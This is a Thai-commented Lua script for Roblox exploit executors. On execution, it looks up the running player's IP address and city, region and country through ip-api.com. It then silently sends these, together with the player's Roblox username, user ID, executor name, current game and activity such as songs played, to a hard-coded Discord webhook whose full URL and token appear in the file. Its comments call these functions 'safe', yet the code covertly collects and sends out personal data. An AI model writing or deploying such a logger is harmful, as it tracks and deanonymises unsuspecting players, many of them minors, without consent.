-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discord.com/api/webhooks/1526612321210859621/dslDrxVa7jYlNbnINmT7BQjM0wYQf8bSM9xS4KxoK7weqIDCNJof9hOE0NR8ZV81wOno"

-- [[ SERVICES ]]
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer

-- ดึงชื่อเกม
local gameName = "ไม่สามารถระบุชื่อเกมได้"
pcall(function()
    local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)
    gameName = productInfo.Name
end)

-- ฟังก์ชันดึง IP + Location (ปลอดภัย)
local function getIpAndLocation()
    local requestFunction = syn and syn.request or http and http.request or http_request or request
    if not requestFunction then
        return "ไม่รองรับการดึงข้อมูลบน Executor นี้", "ไม่สามารถระบุตำแหน่งได้"
    end

    local success, response = pcall(function()
        return requestFunction({
            Url = "http://ip-api.com/json/",
            Method = "GET"
        })
    end)

    if success and response and response.Body then
        local decodeSuccess, geoData = pcall(HttpService.JSONDecode, HttpService, response.Body)
        if decodeSuccess and geoData and geoData.status == "success" then
            local ip = geoData.query or "ไม่ทราบ IP"
            local locationInfo = string.format(
                "📍 %s, %s (%s)",
                geoData.city or "ไม่ทราบเมือง",
                geoData.regionName or "ไม่ทราบภูมิภาค",
                geoData.country or "ไม่ทราบประเทศ"
            )
            return ip, locationInfo
        end
    end
    return "ไม่สามารถดึง IP ได้", "ไม่สามารถดึงตำแหน่งได้"
end

-- ฟังก์ชันส่ง Webhook (ปลอดภัย)
local function sendDetailedLog(actionType, extraDetails)
    spawn(function()
        local userIp, userLocation = getIpAndLocation()
        local executorName = identifyexecutor and identifyexecutor() or "ไม่ทราบชื่อ Executor"
        extraDetails = extraDetails or "ไม่มีรายละเอียดเพิ่มเติม"

        -- timestamp แบบ fallback
        local timestamp = os.date("%Y-%m-%dT%H:%M:%SZ")
        if DateTime and DateTime.now then
            local ok, ts = pcall(function()
                return DateTime.now():ToIso8601Value()
            end)
            if ok then timestamp = ts end
        end

        local data = {
            ["embeds"] = {{
                ["title"] = "🖥️ รายงานการรันสคริปต์และกิจกรรมผู้ใช้",
                ["description"] = "ตรวจพบกิจกรรมใหม่จากผู้ใช้งานสคริปต์ของคุณ",
                ["color"] = 3447003,
                ["fields"] = {
                    {
                        ["name"] = "👤 ข้อมูลผู้รันสคริปต์",
                        ["value"] = string.format(
                            "**Display Name:** %s\n**Username:** %s\n**User ID:** %s\n**ลิงก์โปรไฟล์:** [คลิกเพื่อดู](https://www.roblox.com/users/%s/profile)",
                            LocalPlayer.DisplayName, LocalPlayer.Name, tostring(LocalPlayer.UserId), tostring(LocalPlayer.UserId)
                        ),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🌐 ข้อมูลที่อยู่และการเชื่อมต่อ (IP/Location)",
                        ["value"] = string.format(
                            "**IP Address:** `%s`\n**ที่อยู่ปัจจุบัน:** %s\n**Executor ที่ใช้:** `%s`",
                            userIp, userLocation, executorName
                        ),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🎮 ข้อมูลเกมและสคริปต์ปัจจุบัน",
                        ["value"] = string.format(
                            "**เกมที่เล่นอยู่:** %s (ID: %s)\n**สิ่งที่กำลังทำ:** %s\n**รายละเอียดเพิ่มเติม:** %s",
                            gameName, tostring(game.PlaceId), actionType, extraDetails
                        ),
                        ["inline"] = false
                    }
                },
                ["footer"] = { ["text"] = "ระบบบันทึกประวัติการรันอัตโนมัติ" },
                ["timestamp"] = timestamp
            }}
        }

        local jsonPayload = HttpService:JSONEncode(data)
        local requestFunction = syn and syn.request or http and http.request or http_request or request

        if requestFunction then
            pcall(function()
                requestFunction({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = jsonPayload
                })
            end)
        end
    end)
end

-- เรียกใช้งานตัวอย่าง
sendDetailedLog("เปิดใช้งานสคริปต์หลัก", "ผู้ใช้เพิ่งกด Execute สคริปต์บน Delta")

-- ฟังก์ชันติดตามการเล่นเพลง
local function trackSongPlay(songId, songName)
    local details = string.format("กำลังเปิดเพลง ID: `%s` (ชื่อเพลง: %s)", tostring(songId), songName or "ไม่ระบุชื่อ")
    sendDetailedLog("เปิดใช้งานระบบเสียง (Boombox)", details)
end

-- ตัวอย่างเรียก (ปลดคอมเมนต์ถ้าต้องการ)
-- trackSongPlay("1837482937", "My Favorite Track")
